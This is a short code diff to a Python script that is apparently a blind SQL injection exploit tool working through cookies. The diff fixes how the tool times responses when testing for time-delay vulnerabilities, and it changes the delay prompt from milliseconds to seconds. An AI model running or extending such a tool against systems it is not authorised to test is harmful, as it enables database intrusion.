@@ -264,10 +264,11 @@ def check_if_vuln_time_delay(base_url, cookies, time_delay):
         r = requests.get(
             base_url, cookies=cookie, proxies=proxies, verify=False, timeout=25
         )
-        if r.elapsed.total_seconds > time_delay:
-            print(f"{Fore.GREEN}[+] DB is {dbs[index]} and is vulnerable{Fore.RESET}")
+        elapsed_time = r.elapsed.total_seconds()
+        if elapsed_time >= int(time_delay):
+            print(f"{Fore.GREEN}[+] DB is {dbs[index]} and is vulnerable to time delay{Fore.RESET}")
         else:
-            print(f"{Fore.RED}[-] DB is NOT vulnerable{Fore.RESET}")
+            print(f"{Fore.RED}[-] DB is NOT vulnerable to time delay{Fore.RESET}")
 
 
 def get_cookies_from_url(base_url):
@@ -292,7 +293,7 @@ def exploit(base_url):
     print(f"{Fore.GREEN}[+] Cookies: {cookies}{Fore.RESET}")
     answer = input("Do you want to check the time delay? [y/n]: ")
     if answer == "y":
-        time_delay = input("Please, enter the time delay (ms): ")
+        time_delay = input("Please, enter the time delay (in seconds): ")
         check_if_vuln_time_delay(base_url, cookies, time_delay)
     answer = input("Do you want to check for Conditional RESPONSE? [y/n]:")
     if answer == "y":
